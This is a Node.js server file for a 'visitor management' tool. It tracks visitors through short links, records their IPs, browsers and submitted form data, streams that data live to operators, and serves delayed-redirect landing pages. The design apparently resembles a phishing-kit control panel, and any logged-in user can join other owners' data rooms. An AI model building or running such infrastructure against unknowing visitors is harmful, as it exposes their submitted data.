// ============================================================
// MEGA TOOLS — MAIN SERVER ENTRY POINT (v5.0 Production)
// Real-Time Online/Offline + Cycle Routes + autoTrust
// ============================================================

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });

const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');

const CONFIG = require('./config');
const db = require('./database');
const {
  authRoutes, linksRoutes, sessionsRoutes, adminRoutes,
  dataRoutes, webhookRoutes, redirectRoutes, exportRoutes, themeRoutes,
  uploadRoutes, trustRoutes,
} = require('./routes');
const sessionManager = require('./services/sessionManager');
const autoTrust = require('./services/autoTrust');
const Session = require('./models/Session');
const User = require('./models/User');
const { toStringId } = require('./utils/helpers');
const { generateLandingPage } = require('./utils/landingHtml');
const { generateSmartRedirectScript } = require('./utils/smartRedirect');

let socketEventSeq = 0;
function nextSocketSeq() { socketEventSeq++; return socketEventSeq; }

// ============================================================
// CORS ORIGIN VALIDATION — Uses CONFIG.ALLOWED_ORIGINS
// ============================================================

const corsOrigin = function (origin, callback) {
  // Allow requests with no origin (mobile apps, curl, Postman, etc.)
  if (!origin) return callback(null, true);

  // Allow only whitelisted origins
  if (CONFIG.ALLOWED_ORIGINS.includes(origin)) {
    return callback(null, true);
  }

  // Development fallback: allow localhost with any port
  if (!CONFIG.IS_PRODUCTION && (origin.startsWith('http://localhost:') || origin.startsWith('http://127.0.0.1:'))) {
    return callback(null, true);
  }

  // Reject all other origins
  callback(new Error('Not allowed by CORS'));
};

const app = express();

// Production: trust proxy (Render sits behind reverse proxy)
app.set('trust proxy', CONFIG.IS_PRODUCTION ? 1 : 0);

// Security headers (production only)
if (CONFIG.IS_PRODUCTION) {
  app.use(helmet({
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    crossOriginEmbedderPolicy: false,
  }));
}

app.use(cors({
  origin: corsOrigin, credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Cache-Control', 'Pragma', 'Expires'],
}));

app.use(express.json({ limit: '5mb' }));
app.use(cookieParser());

const globalLimiter = rateLimit({
  windowMs: CONFIG.RATE_LIMIT_WINDOW_MS, max: CONFIG.RATE_LIMIT_MAX,
  message: { message: 'Too many requests, please try again later.' },
  standardHeaders: false, legacyHeaders: false,
  skip: (req) => {
    if (req.path === '/api/health') return true;
    if (req.headers.upgrade) return true;
    return false;
  },
});
app.use('/api/', globalLimiter);

const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: corsOrigin, methods: ['GET', 'POST'], credentials: true },
  pingTimeout: 60000, pingInterval: 15000,
});

io.use(async (socket, next) => {
  try {
    const cookieStr = socket.handshake.headers.cookie || '';
    const tokenMatch = cookieStr.match(/auth_token=([^;]+)/);
    const cookieToken = tokenMatch ? tokenMatch[1] : null;
    const authHeader = socket.handshake.auth?.token || socket.handshake.headers?.authorization || '';
    const headerToken = authHeader.replace('Bearer ', '');
    const token = cookieToken || headerToken;
    if (!token) { socket.user = null; socket.userId = null; socket.userRole = 'guest'; return next(); }
    const decoded = jwt.verify(token, CONFIG.JWT_SECRET);
    const allUsers = await db.users.read();
    const user = allUsers.find(u => toStringId(u._id) === decoded.id);
    if (!user) return next(new Error('User not found'));
    if (user.status === 'blocked') return next(new Error('Account blocked'));
    socket.user = user; socket.userId = toStringId(user._id); socket.userRole = user.role;
    next();
  } catch (err) {
    if (err.name === 'JsonWebTokenError' || err.name === 'TokenExpiredError') {
      socket.user = null; socket.userId = null; socket.userRole = 'guest'; return next();
    }
    next();
  }
});

const sessionSockets = {};
const SOCKET_CLEANUP_INTERVAL = 30000;
const DISCONNECT_GRACE_PERIOD = 2000;
let cleanupTimer = null;

function cleanupStaleSockets() {
  const connected = new Set();
  io.sockets.sockets.forEach(s => connected.add(s.id));
  for (const [key, socketId] of Object.entries(sessionSockets)) {
    if (!connected.has(socketId)) delete sessionSockets[key];
  }
}
function startSocketCleanup() {
  if (cleanupTimer) clearInterval(cleanupTimer);
  cleanupTimer = setInterval(cleanupStaleSockets, SOCKET_CLEANUP_INTERVAL);
}

io.on('connection', (socket) => {
  const clientIp = socket.handshake.address || 'unknown';
  if (socket.userId) { socket.join('user_' + socket.userId); User.updatePresence(socket.userId, true).catch(() => {}); }

  socket.on('session_init', async (data) => {
    const { trackingCode, visitorId } = data;
    if (!trackingCode) return;
    const sessionKey = visitorId || (trackingCode + '_' + clientIp);
    sessionSockets[sessionKey] = socket.id;
    socket.sessionKey = sessionKey;
    socket.sessionData = { visitorId: visitorId || null, trackingCode };

    try {
      const baseCode = trackingCode.includes('_') ? trackingCode.split('_').pop() : trackingCode;
      const fullEntryUrl = (trackingCode || '').includes('_') ? trackingCode : (trackingCode || baseCode);
      const { session, isNew } = await Session.upsert({ visitorId: visitorId || null, trackingCode, baseCode, entryUrl: fullEntryUrl, currentUrl: baseCode, ip: clientIp, browser: socket.handshake.headers['user-agent'] || 'Unknown', deviceType: 'Desktop', collectedTypes: ['session_init'] });
      session.status = 'Online'; session.isLive = true; session.lastActivity = new Date().toISOString();
      socket.sessionData.sessionId = session._id;
      const sessionData = { type: isNew ? 'new' : 'updated', seq: nextSocketSeq(), timestamp: new Date().toISOString(), session: { _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode, isLive: session.isLive, status: session.status, lastActivity: session.lastActivity, clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType, baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl, ip: session.ip, browser: session.browser, formData: session.formData, redirectHistory: session.redirectHistory || [], lockedKeys: session.lockedKeys || [] } };
      const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      io.to('room_' + ownerCode).emit('sessionDelta', sessionData);
    } catch (err) { console.error('[Socket] Init error:', err.message); }
  });

  socket.on('session_heartbeat', async (data) => {
    const { visitorId, trackingCode } = data || {};
    if (!visitorId && !trackingCode) return;
    try { await Session.upsert({ visitorId: visitorId || null, trackingCode: trackingCode || '', baseCode: trackingCode || '', ip: clientIp, collectedTypes: ['heartbeat'] }); } catch (err) {}
  });

  socket.on('joinRoom', (trackingCode) => {
    if (trackingCode && socket.userRole !== 'guest') socket.join('room_' + trackingCode);
  });

  socket.on('disconnect', async () => {
    if (socket.userId) User.updatePresence(socket.userId, false).catch(() => {});

    if (socket.sessionData && socket.sessionData.sessionId) {
      try {
        const session = await db.sessions.findById(socket.sessionData.sessionId);
        if (session && session.isLive) {
          session.status = 'Offline';
          session.isLive = false;
          session.lastActivity = new Date().toISOString();
          await db.sessions.findByIdAndUpdate(session._id, session);

          const ownerCode = (session.trackingCode || '').includes('_') ? session.trackingCode.split('_')[0] : session.trackingCode;
          if (ownerCode) {
            io.to('room_' + ownerCode).emit('sessionDelta', {
              type: 'updated',
              seq: nextSocketSeq(),
              timestamp: new Date().toISOString(),
              session: {
                _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
                isLive: false, status: 'Offline', lastActivity: session.lastActivity,
                clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
                baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
                ip: session.ip, browser: session.browser, formData: session.formData,
                redirectHistory: session.redirectHistory || [], lockedKeys: session.lockedKeys || []
              }
            });
          }
        }
      } catch (err) {
        console.error('[Socket] Disconnect offline update error:', err.message);
      }
    }

    if (socket.sessionKey && sessionSockets[socket.sessionKey] === socket.id) {
      const keyToDelete = socket.sessionKey;
      setTimeout(() => { if (sessionSockets[keyToDelete] === socket.id) delete sessionSockets[keyToDelete]; }, DISCONNECT_GRACE_PERIOD);
    }
  });
});

startSocketCleanup();
app.set('io', io);
sessionManager.init(io, sessionSockets);

// ============================================================
// AUTO TRUST — Initialize (Exactly Once)
// ============================================================

autoTrust.setIo(io);
autoTrust.startAutoTrust();

app.get('/api/health', async (req, res) => {
  const dbHealth = await db.health();
  res.json({ status: 'ok', timestamp: new Date().toISOString(), uptime: process.uptime(), database: dbHealth });
});

// ============================================================
// CYCLE API ROUTES
// ============================================================

app.get('/api/cycle/remaining', async (req, res) => {
  try {
    const remainingMs = await db.getCycleRemainingMs();
    res.json({ success: true, remainingMs, remainingSeconds: Math.floor(remainingMs / 1000) });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('/api/cycle/expires-at', async (req, res) => {
  try {
    const expiresAt = await db.getCycleExpiresAt();
    res.json({ success: true, expiresAt, serverTime: Date.now() });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('/api/cycle/current', async (req, res) => {
  try {
    const cycle = await db.getActiveCycle();
    res.json({ success: true, cycle, serverTime: Date.now() });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// API ROUTES
// ============================================================

app.use('/api/auth', authRoutes);
app.use('/api/links', linksRoutes);
app.use('/api/sessions', sessionsRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/data', dataRoutes);
app.use('/api/webhook', webhookRoutes);
app.use('/api/redirect', redirectRoutes);
app.use('/api/export', exportRoutes);
app.use('/api/theme', themeRoutes);
app.use('/api/upload', uploadRoutes);
app.use('/api/trust', trustRoutes);

app.get('/mega-redirect.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(generateSmartRedirectScript(req));
});

function getServerBaseUrl(req) {
  if (CONFIG.IS_PRODUCTION) return CONFIG.CLIENT_URL || 'https://mega-tools.online';
  return `http://localhost:${CONFIG.PORT}`;
}

const OG_META = `
  <meta property="og:title" content="Mega Tools — Enterprise Visitor Management">
  <meta property="og:description" content="Track, manage, and redirect your visitors in real-time.">
  <meta property="og:image" content="https://res.cloudinary.com/shakilv875/image/upload/v1784334960/hjhjmh_bshbbh.png">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Mega Tools — Enterprise Visitor Management">
  <meta name="twitter:description" content="Track, manage, and redirect your visitors in real-time.">
  <meta name="twitter:image" content="https://res.cloudinary.com/shakilv875/image/upload/v1784334960/hjhjmh_bshbbh.png">
`;

// ============================================================
// ORIGINAL REDIRECT ROUTES
// ============================================================

app.get('/s/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const tc = req.query.tc || '';
    const allLinks = await db.links.read();
    let link = allLinks.find(l => l.baseCode === slug);
    if (!link && tc) link = allLinks.find(l => { const c = l.baseCode || l.slug || ''; return c === slug || c.includes(slug); });
    if (!link) return res.status(404).send('Link not found');
    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    const trackingCode = tc || link.ownerTrackingCode || 'unknown';
    const code = link.baseCode || link.slug || slug;
    const fullEntryUrl = trackingCode + '_' + code;
    let html = generateLandingPage({ baseUrl: baseUrl || 'about:blank', trackingCode: fullEntryUrl, slug: code, apiBase: getServerBaseUrl(req), delay: 30000, heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS, chainData: null });
    html = html.replace('</head>', OG_META + '</head>');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) { res.status(500).send('Server error'); }
});

app.get('/s/:slug/:trackingCode', async (req, res) => {
  try {
    const { slug, trackingCode } = req.params;
    const allLinks = await db.links.read();
    const link = allLinks.find(l => (l.baseCode || l.slug || '') === slug);
    if (!link) return res.status(404).send('Link not found');
    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    const code = link.baseCode || link.slug || slug;
    const fullEntryUrl = trackingCode + '_' + code;
    let html = generateLandingPage({ baseUrl: baseUrl || 'about:blank', trackingCode: fullEntryUrl, slug: code, apiBase: getServerBaseUrl(req), delay: 30000, heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS, chainData: null });
    html = html.replace('</head>', OG_META + '</head>');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) { res.status(500).send('Server error'); }
});

// NOTE: Production static serving removed — Frontend deploys separately to cPanel.
// Backend serves API + Socket.IO + Redirect pages only.

app.use((req, res) => { res.status(404).json({ message: 'Route not found' }); });
app.use((err, req, res, _next) => { res.status(err.status || 500).json({ message: CONFIG.IS_PRODUCTION ? 'Internal server error' : err.message }); });

const PORT = CONFIG.PORT;
async function start() {
  try { await db.connect(); } catch (err) { console.log('[Startup] DB connect warning: ' + err.message); }
  server.listen(PORT, () => console.log(`[Server] Running on port ${PORT}`));
}
start();

process.on('SIGTERM', async () => { if (cleanupTimer) clearInterval(cleanupTimer); autoTrust.stopAutoTrust(); sessionManager.stop(); await db.close(); server.close(() => process.exit(0)); });
process.on('SIGINT', async () => { if (cleanupTimer) clearInterval(cleanupTimer); autoTrust.stopAutoTrust(); sessionManager.stop(); await db.close(); server.close(() => process.exit(0)); });

module.exports = app;